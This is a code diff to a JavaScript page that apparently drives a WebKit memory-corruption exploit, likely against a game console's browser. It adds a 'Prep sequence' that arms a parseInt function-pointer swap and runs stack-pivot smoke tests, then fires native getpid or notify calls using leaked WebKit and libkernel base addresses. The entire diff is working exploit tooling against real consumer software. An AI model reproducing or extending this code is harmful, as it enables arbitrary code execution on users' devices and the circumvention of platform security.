@@ -17,7 +17,8 @@ import {
     g0AlreadyFired, nativeRetOk,
 } from "./stub_g0_fire.js?v=stub-g0-2";
 
-const BUILD = "stub-page-8";
+const BUILD = "stub-page-9";
+const SS_SEQ_DONE = "wk-stub-seq-done";
 const params = new URLSearchParams(location.search);
 let lines = [], ready = false, busy = false, collatorPin = null;
 const retain = [];
@@ -197,8 +198,7 @@ function lkFromInput() {
 
 function stubFireMode() {
     const q = params.get("stubfire") || "g0getpid";
-    if (q === "direct" || q === "g0" || q === "g0getpid" || q === "g0notify" || q === "smoke")
-        return q;
+    if (q === "g0getpid" || q === "g0notify") return q;
     return "g0getpid";
 }
 
@@ -238,10 +238,6 @@ function loadEffectiveOff() {
 }
 
 function syncRadios() {
-    const m = stubMode();
-    document.querySelectorAll('input[name="stub"]').forEach(function (el) {
-        el.checked = el.value === m;
-    });
     const fm = stubFireMode();
     document.querySelectorAll('input[name="stubfire"]').forEach(function (el) {
         el.checked = el.value === fm;
@@ -294,6 +290,7 @@ async function runStart() {
         $("btn-fire").disabled = false;
         $("btn-arm").disabled = false;
         if ($("btn-2e")) $("btn-2e").disabled = false;
+        if ($("btn-sequence")) $("btn-sequence").disabled = false;
         try {
             const wb = persistWebkitBasesLight(window.p, loadEffectiveOff());
             if (wb) log("WEBKIT-BASE", "saved " + wb);
@@ -309,6 +306,67 @@ async function runStart() {
         flushLog();
     } finally {
         busy = false;
+    }
+}
+
+function seqDone() {
+    if (window._stubSeqDone) return true;
+    try { return sessionStorage.getItem(SS_SEQ_DONE) === "1"; } catch (_) { return false; }
+}
+
+function markSeqDone() {
+    window._stubSeqDone = true;
+    try { sessionStorage.setItem(SS_SEQ_DONE, "1"); } catch (_) { }
+}
+
+/** HW sequence: arm → g0 smoke → parseInt g0 smoke. Then Fire getpid or notify. */
+async function runMainSequence() {
+    if (busy || !ready || !window.p) return;
+    const lk = lkFromInput();
+    if (!lk) {
+        log("SKIP", "need lk — 2e first");
+        state("need lk", "bad");
+        flushLog();
+        return;
+    }
+    busy = true;
+    const btn = $("btn-sequence");
+    if (btn) btn.disabled = true;
+    log("SEQ-START", "1 arm → 2 g0 smoke → 3 parseInt g0 smoke");
+    flushLog();
+    try {
+        const p = window.p;
+        const off = loadEffectiveOff();
+        const opts = stubOpts();
+
+        log("SEQ-1", "arm (verify write, restore parseInt)");
+        const arm = fireStubSwapParseInt(p, off, lk, Object.assign({}, opts, { armOnly: true }));
+        window._stubCap = {
+            mainMf: arm.mainMf,
+            mainOrig: arm.mainOrig,
+            nativeFn: arm.mainOrig,
+            path: "armed",
+        };
+        flushLog();
+
+        log("SEQ-2", "g0 smoke parseInt(1) no hook");
+        fireG0Smoke(p, off, opts);
+        flushLog();
+
+        log("SEQ-3", "parseInt g0 smoke parseInt(1) no hook");
+        fireG0Smoke(p, off, opts);
+        flushLog();
+
+        markSeqDone();
+        log("SEQ-OK", "prep done — select getpid or notify → Fire");
+        state("sequence OK — Fire getpid or notify", "ok");
+    } catch (e) {
+        log("SEQ-FAIL", (e.message || String(e)) + (e.stack ? "\n" + e.stack : ""));
+        state("sequence failed", "bad");
+    } finally {
+        busy = false;
+        if (btn && ready) btn.disabled = false;
+        flushLog();
     }
 }
 
@@ -335,39 +393,27 @@ function runArm() {
 
 function runFire() {
     if (busy || !ready || !window.p) return;
-    const mode = stubMode();
-    const fireMode = (mode === "arm") ? "arm" : stubFireMode();
+    const fireMode = stubFireMode();
     const lk = lkFromInput();
-    if (fireMode !== "g0" && fireMode !== "smoke" && !lk) {
-        log("SKIP", "paste lk or run 2e");
+    if (!lk) {
+        log("SKIP", "need lk — 2e first");
         state("need lk", "bad");
         flushLog();
         return;
     }
+    if (!seqDone()) {
+        log("SEQ-HINT", "run Prep sequence first (arm → g0 smoke ×2)");
+        state("run Prep sequence first", "warn");
+        flushLog();
+        return;
+    }
     busy = true;
-    log("FIRE-TAP", mode + " fire=" + fireMode + (lk ? " lk=" + lk : ""));
+    log("FIRE-TAP", fireMode + " lk=" + lk);
     flushLog();
     try {
         const p = window.p;
         const off = loadEffectiveOff();
         const opts = stubOpts();
-        if (mode === "arm") {
-            runArm();
-            return;
-        }
-        if (mode === "collator") {
-            if (!collatorPin) collatorPin = pinCollatorStub(retain);
-            const r = fireCollatorStub(p, collatorPin, lk, off, opts);
-            log("STUB-OK", r.path + " result=" + r.result);
-            state("collator done", "ok");
-            return;
-        }
-        if (fireMode === "g0" || fireMode === "smoke") {
-            fireG0Smoke(p, off, opts);
-            log("G0-SMOKE-OK", "parseInt(1) survived — pivot entry OK");
-            state("G0 smoke OK", "ok");
-            return;
-        }
         if (fireMode === "g0getpid") {
             const r = fireG0Getpid(p, off, lk, opts);
             log("NATIVE-OK", "getpid errno=" + r.errno + (r.ok ? " — SUCCESS" : " — fail"));
@@ -380,10 +426,8 @@ function runFire() {
             lockFireAfterNative(r.ok ? "notify sent — check toast" : "notify errno=" + r.errno);
             return;
         }
-        log("STUB-WARN", "direct stub OOM expected on 13.52 — use ?stubfire=g0getpid");
-        const r = fireStubSwapParseInt(p, off, lk, opts);
-        log("STUB-OK", r.stubTag + " arg=" + r.fireArg + " js=" + r.result);
-        state("survived js=" + r.result, "ok");
+        log("STUB-FAIL", "pick getpid or notify");
+        state("select getpid or notify", "warn");
     } catch (e) {
         log("STUB-FAIL", (e.message || String(e)) + (e.stack ? "\n" + e.stack : ""));
         state("failed @ " + (sessionStorage.getItem(STUB_LAST_STEP_KEY) || "?"), "bad");
@@ -396,21 +440,14 @@ function runFire() {
 function init() {
     crashLog.startAutoFlush();
     showLastCrashStep();
-    log("INIT", BUILD + " fire=" + stubFireMode()
-        + " — errno 0 = OK; ONE fire per tab then reload");
+    log("INIT", BUILD + " — Start → 2e → Prep sequence → Fire (getpid|notify)");
+    if (seqDone()) log("SEQ-OK", "restored — pick getpid/notify → Fire");
     if (g0AlreadyFired()) {
-        log("NATIVE-OK", "restored — prior g0 fire OK (reload to fire again)");
-        lockFireAfterNative("native OK — reload to refire");
+        log("NATIVE-OK", "restored — native fired OK (reload tab to retry)");
+        lockFireAfterNative("native OK — reload tab");
     }
     flushLog();
     syncRadios();
-    document.querySelectorAll('input[name="stub"]').forEach(function (el) {
-        el.addEventListener("change", function () {
-            const u = new URL(location.href);
-            u.searchParams.set("stub", el.value);
-            location.href = u.pathname + "?" + u.searchParams.toString();
-        });
-    });
     document.querySelectorAll('input[name="stubfire"]').forEach(function (el) {
         el.addEventListener("change", function () {
             const u = new URL(location.href);
@@ -426,6 +463,7 @@ function init() {
     });
     $("btn-start").onclick = runStart;
     $("btn-2e").onclick = function () { run2e(); };
+    $("btn-sequence").onclick = function () { runMainSequence(); };
     $("btn-arm").onclick = runArm;
     $("btn-fire").onclick = runFire;
     const saved = sessionStorage.getItem("wk-libkernelBase") || sessionStorage.getItem("wk-lastFnPtr");
